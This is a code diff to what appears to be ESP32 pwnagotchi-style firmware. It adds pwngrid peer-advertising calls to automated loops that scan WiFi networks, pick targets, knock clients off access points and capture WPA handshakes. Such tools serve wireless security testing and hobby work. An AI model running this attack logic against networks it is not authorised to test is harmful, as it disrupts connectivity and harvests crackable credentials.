@@ -8,6 +8,7 @@
 #include "EapolSniffer.h"
 #include "ui.h"
 #include <vector>
+#include "pwngrid.h"
 
 bool pwnagothiModeEnabled;
 bool pwnagothiScan = true;
@@ -124,7 +125,7 @@ bool pwnagothiBegin(){
         logMessage("Personality init failed");
         return false;
     }
-    if(!(WiFi.mode(WIFI_MODE_STA))){
+    if(!(wifion())){
         logMessage("WiFi init failed");
         return false;
     }   
@@ -223,6 +224,7 @@ void pwnagothiLoop(){
     if(pwnagothiScan){
         logMessage("(<_>) Speed scanning..");
         setMood(1, "(<_>)", "Speed scanning..");
+        pwngridAdvertise(1, "(<_>)");
         updateUi(true, false);
         g_speedScanResults.clear();
         // run promiscuous fast scan
@@ -232,10 +234,12 @@ void pwnagothiLoop(){
             pwnagothiScan = false;
             logMessage("(*_*) Speed scan completed proceding to attack!");
             setMood(1, "(*_*)", "Speed scan completed proceding to attack!");
+            pwngridAdvertise(1, "(*_*)");
             updateUi(true, false);
             delay(pwnagotchi.delay_after_wifi_scan);
         } else {
             logMessage("('_') No networks found by speed scan. Falling back to slow scan and retrying.");
+            pwngridAdvertise(1, "('_')");
             updateUi(true, false);
             WiFi.scanNetworks();
             delay(pwnagotchi.delay_after_no_networks_found);
@@ -247,6 +251,7 @@ void pwnagothiLoop(){
         // ensure we have results and index is in range
         if(g_speedScanResults.empty()){
             logMessage("('_') No speed-scan results available, re-scheduling scan.");
+            pwngridAdvertise(1, "('_')");
             pwnagothiScan = true;
             return;
         }
@@ -267,6 +272,7 @@ void pwnagothiLoop(){
 
         setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
         logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
+        pwngridAdvertise(1, "(@_@)");
         updateUi(true, false);
         delay(pwnagotchi.delay_after_picking_target);
 
@@ -278,6 +284,7 @@ void pwnagothiLoop(){
                 // safe -> skip
                 setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                 logMessage("(x_x) Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
+                pwngridAdvertise(1, "(x_x)");
                 updateUi(true, false);
                 wifiCheckInt++;
                 return;
@@ -296,6 +303,8 @@ void pwnagothiLoop(){
             return;
         }
         setMood(1 , "(@_@)", "WELL, Everyone is OUT!");
+        pwngridAdvertise(1, "(@_@)");
+        logMessage("(@_@) WELL, Everyone is OUT!");
         updateUi(true, false);
         setTargetAP(&entry.bssid[0]);
 
@@ -319,6 +328,7 @@ void pwnagothiLoop(){
 
         setMood(1, "(@--@)", "Sniff, sniff... Looking for handshake..." );
         logMessage("(@--@) Sniff, sniff... Looking for handshake...");
+        pwngridAdvertise(1, "(@--@)");
         updateUi(true, false);
         unsigned long startTime1 = millis();
 
@@ -339,9 +349,11 @@ void pwnagothiLoop(){
                 }
                 setMood(1, "(^_^)", "Got new handshake!!!" );
                 logMessage("(^_^) Got new handshake!!!");
+                pwngridAdvertise(1, "(^_^)");
                 lastPwnedAP = attackVector;
                 updateUi(true, false);
                 SnifferEnd();
+                initPwngrid();
                 pwned_ap++;
                 sessionCaptures++;
                 wifiCheckInt++;
@@ -364,8 +376,10 @@ void pwnagothiLoop(){
 
             if (millis() - startTime1 > pwnagotchi.handshake_wait_time) {
                 setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
+                pwngridAdvertise(1, "(~_~)");
                 logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                 SnifferEnd();
+                initPwngrid();
                 updateUi(true, false);
 
                 delay(pwnagotchi.delay_after_attack_fail);
@@ -387,6 +401,7 @@ void pwnagothiLoop(){
 
     setMood(1, "(>_<)", "Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
     logMessage("(>_<) Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
+    pwngridAdvertise(1, "(>_<)");
     updateUi(true, false);
     delay(pwnagotchi.nap_time);
 }
@@ -394,6 +409,7 @@ void pwnagothiLoop(){
 void pwnagothiStealthLoop(){
     if(pwnagothiScan){
         logMessage("(<_>) Scanning..");
+        pwngridAdvertise(1, "(<_>)");
         setMood(1, "(<_>)", "Scanning..");
         updateUi(true, false);
         WiFi.scanNetworks();
@@ -402,17 +418,21 @@ void pwnagothiStealthLoop(){
             pwnagothiScan = false;
             logMessage("(*_*) Scan compleated proceding to attack!");
             setMood(1, "(*_*)", "Scan compleated proceding to attack!");
+            pwngridAdvertise(1, "(*_*)");
             updateUi(true, false);
             delay(pwnagotchi.delay_after_wifi_scan);
         }
     }
     else{
         setMood(1, "(z-z)", "waiting...");
+        pwngridAdvertise(1, "(z-z)");
         updateUi(true, false);
         delay(pwnagotchi.delay_before_switching_target);
         String attackVector;
         if(!WiFi.SSID(0)){
             logMessage("('_') No networks found. Waiting and retrying");
+            pwngridAdvertise(1, "('_')");
+            setMood(1, "('_')", "No networks found. Waiting and retrying");
             updateUi(true, false);
             delay(pwnagotchi.delay_after_no_networks_found);
             pwnagothiScan = true;
@@ -427,6 +447,7 @@ void pwnagothiStealthLoop(){
         attackVector = WiFi.SSID(wifiCheckInt);
         setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
         logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
+        pwngridAdvertise(1, "(@_@)");
         updateUi(true, false);
         delay(pwnagotchi.delay_after_picking_target);
         std::vector<String> whitelistParsed = parseWhitelist();
@@ -482,6 +503,7 @@ void pwnagothiStealthLoop(){
                 logMessage("WiFi BSSIS is: " + WiFi.BSSIDstr(wifiCheckInt));
                 logMessage("Client BSSID is: "+ clients[clientLen]);
                 logMessage("(d_b) I think that " + clients[i] + "doesn't need an internet...");
+                pwngridAdvertise(1, "(d_b)");
                 updateUi(true, false);
                 delay(pwnagotchi.delay_after_client_found);
                 stopClientSniffing();
@@ -491,6 +513,7 @@ void pwnagothiStealthLoop(){
         }
         setMood(1, "(O_o)", "Well, well, well  " + clients[i] + " you're OUT!!!" );
         logMessage("(O_o) Well, well, well  " + clients[i] + " you're OUT!!!");
+        pwngridAdvertise(1, "(O_o)");
         updateUi(true, false);
         setTargetAP(WiFi.BSSID(wifiCheckInt));
         if(pwnagotchi.activate_sniffer_on_deauth){
@@ -510,6 +533,7 @@ void pwnagothiStealthLoop(){
         }
         setMood(1, "(@--@)", "Sniff, sniff... Looking for handshake..." );
         logMessage("(@--@) Sniff, sniff... Looking for handshake...");
+        pwngridAdvertise(1, "(@--@)");
         updateUi(true, false);
         unsigned long startTime1 = millis();
         if(!pwnagotchi.activate_sniffer_on_deauth){
@@ -526,9 +550,11 @@ void pwnagothiStealthLoop(){
                 }
                 setMood(1, "(^_^)", "Got new handshake!!!" );
                 logMessage("(^_^) Got new handshake!!!");
+                pwngridAdvertise(1, "(^_^)");
                 lastPwnedAP = attackVector;
                 updateUi(true, false);
                 SnifferEnd();
+                initPwngrid();
                 pwned_ap++;
                 sessionCaptures++;
                 wifiCheckInt++;
@@ -552,6 +578,7 @@ void pwnagothiStealthLoop(){
                 setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                 logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                 SnifferEnd();
+                initPwngrid();
                 updateUi(true, false);
                 
                 delay(pwnagotchi.delay_after_attack_fail);
